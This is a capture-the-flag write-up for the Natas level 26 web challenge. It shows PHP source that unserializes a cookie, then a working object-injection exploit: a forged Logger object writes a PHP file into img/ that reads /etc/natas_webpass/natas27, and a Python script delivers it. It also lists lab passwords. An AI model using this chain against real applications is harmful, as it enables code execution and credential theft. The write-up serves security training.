# Writeup level 26
In this challenge we are able to draw a line by giving values to four different parameters (x1,y1,x2,y2) which will then create a picture for us.

**Source Code**  

```php
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

```
Looking at the source code, we can see that they are saving the parameters for the line as a array and serialize it. They base64 encode the serialized object and put it as our cookie value in "drawing". As soon as I saw that they are using serialized objects, I thought we can inject our own serialized object. In this case they have a class Logger which has a magic php function called __destruct(). This function get's always called when the objects lifetime ends.

**Exploit**  
So like mentioned before, I want to inject my own serialized object or rather said an instance of the Logger class.  
First things first, I am going to copy the __construct() function from the Logger class and edit it with my values. Since we know that they are saving a picture after we put values for the line and also know that the location is url/img/natas26_sessionid.png, we can conclude that the img/ folder is writeable for us. So lets create a php file with php code which is going to get executed as soon as the object gets destroyed. We can see that the __destruct() function from the Logger class opens a logFile, which we are going to edit, and appends the exitMsg. So we just have to change the String for **logFile** and **exitMsg** where logFile is going to be our own file which gets created (img/baldysfile.php) and exitMsg our php code that prints out the password for natas27.

```php
<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct(){
        // initialise variables
        $this->initMsg="hello\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
        $this->logFile = "img/baldysfile.php";
    }                   
}

$logger = new Logger();
$b64_encoded = base64_encode(serialize($logger));

print($b64_encoded);

?>
```
 
 **Final Exploit**  
 
```python
import requests
import base64
import subprocess

url = "http://natas26.natas.labs.overthewire.org/?x1=123&y1=123&x2=123&y2=123"

s = requests.Session()

r = s.get(url, auth=("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"))

cookie_b64 = requests.utils.unquote(r.cookies['drawing'])
cookie_b64_decoded = base64.b64decode(cookie_b64)
session_id = r.cookies['PHPSESSID']

proc = subprocess.Popen(f"php logger.php", shell=True, stdout=subprocess.PIPE)
serialized_logger = proc.stdout.read()
new_cookie = serialized_logger.decode('utf-8')
s.cookies['drawing'] = new_cookie

rr = s.get(url, auth=("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"))
print(rr.text)

url2 = f"http://natas26.natas.labs.overthewire.org/img/baldysfile.php"
r2 = s.get(url2, auth=("natas26", "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"))

print(r2.text)

# 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```
The passwords is:  
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
